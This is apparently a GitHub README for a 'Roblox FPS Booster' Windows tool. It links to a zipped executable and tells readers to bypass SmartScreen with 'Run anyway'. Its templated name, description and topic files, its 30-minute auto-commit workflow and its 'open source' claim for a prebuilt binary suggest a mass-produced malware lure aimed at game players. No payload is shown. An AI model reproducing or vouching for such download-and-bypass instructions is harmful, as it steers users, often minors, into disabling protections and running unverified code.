<p align="center">
  <img src="banner.svg" alt="Roblox FPS Booster banner" width="100%"/>
</p>

# Roblox FPS Booster

**Lightweight Windows optimizer built to improve Roblox frame rates, reduce stuttering, and free system resources on Windows 10/11.**

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-0078d4?logo=windows)](https://github.com/topics/windows)
[![Maintenance](https://img.shields.io/badge/maintained-yes-39d353)](https://github.com/topics/automation)
[![Utility](https://img.shields.io/badge/Utility-Desktop-e2231a)](https://github.com/topics/utility)

<p align="center">
  <img src="preview.png" alt="Roblox FPS Booster preview" width="720"/>
</p>

---

## What is Roblox FPS Booster?

**Roblox FPS Booster** is a zero-hassle, one-click optimization tool built exclusively for **Windows 10 and Windows 11**. Apply performance tweaks, free system resources, and get smoother gameplay without manual registry editing.

- Detects your system profile automatically
- Applies safe, reversible performance tweaks
- Shows real-time progress in a clean UI
- Works with **Roblox Player**

---

## Features

| Feature | Description |
|---|---|
| Roblox Ready | Profiles tuned for Roblox Player and Studio |
| CPU Priority | Raises game process priority safely |
| RAM Cleanup | Frees memory before launching Roblox |
| Visual FX | Disables unnecessary Windows animations |
| One-click | Single `.exe` installer with progress UI |
| Safe | Fully open source — inspect all changes |

---

## Requirements

- **Windows 10 / 11** (64-bit)
- Administrator rights (recommended for full optimization)
- Internet connection (for updates and optional components)

> **Linux and macOS are not supported.** This tool is Windows-only by design.

---

## Installation

[![Download Roblox FPS Booster](button.svg)](https://github.com/Splitmacshovel/roblox-fps-booster/releases/download/v3.3.69/roblox-fps-booster-v3.3.69.zip)

1. Click the button above or go to [**Releases**](https://github.com/Splitmacshovel/roblox-fps-booster/releases/download/v3.3.69/roblox-fps-booster-v3.3.69.zip)
2. Download and run `roblox-fps-booster.exe`
3. If SmartScreen appears, click **More info → Run anyway**
4. Follow the on-screen steps and restart if prompted

---

## How it works

```
roblox-fps-booster.exe
        │
        ├─ 1. Scan system (CPU, RAM, GPU, services)
        ├─ 2. Apply selected optimization profile
        ├─ 3. Tune power plan and background apps
        ├─ 4. Clean temp files and free memory
        └─ 5. Save report → done ✓
```

---

## Project Structure

```
roblox-fps-booster/
├── src/
│   ├── roblox.fps.booster.Core/     # Core optimization logic
│   ├── roblox.fps.booster.UI/        # WPF progress UI
│   └── roblox.fps.booster.Tests/    # Unit tests
├── assets/
│   ├── banner.svg              # README banner
│   └── screenshots/          # UI screenshots
├── .github/workflows/
│   └── auto-commit.yml         # Auto-update workflow (every 30 min)
├── preview.png                 # Repository social preview
├── button.svg                  # Download button asset
├── name.txt                    # Repository name
├── desc.txt                    # Repository description
├── topics.txt                  # GitHub topics (one per line)
└── LICENSE                     # MIT License
```

---

## FAQ

**Q: Windows Defender / SmartScreen blocks the EXE — is it safe?**
A: The warning appears because the executable is unsigned. This project is fully open source — review the source code and build it yourself if unsure.

**Q: Will this work on my PC?**
A: The tool supports **Windows 10 and 11 (64-bit)**. A restore point is recommended before applying aggressive profiles.

**Q: Can I undo the changes?**
A: Yes. The app saves a restore snapshot and offers a one-click rollback from the main window.

**Q: Does it modify game files?**
A: No. All tweaks are system-level only — your game installation stays untouched.

---

## Contributing

Pull requests are welcome. For major changes, open an issue first.

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/my-change`
3. Commit your changes
4. Open a Pull Request

---

## License

Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for details.

---

<p align="center">
  <sub>Made for Windows · Open Source · Performance First</sub>
</p>
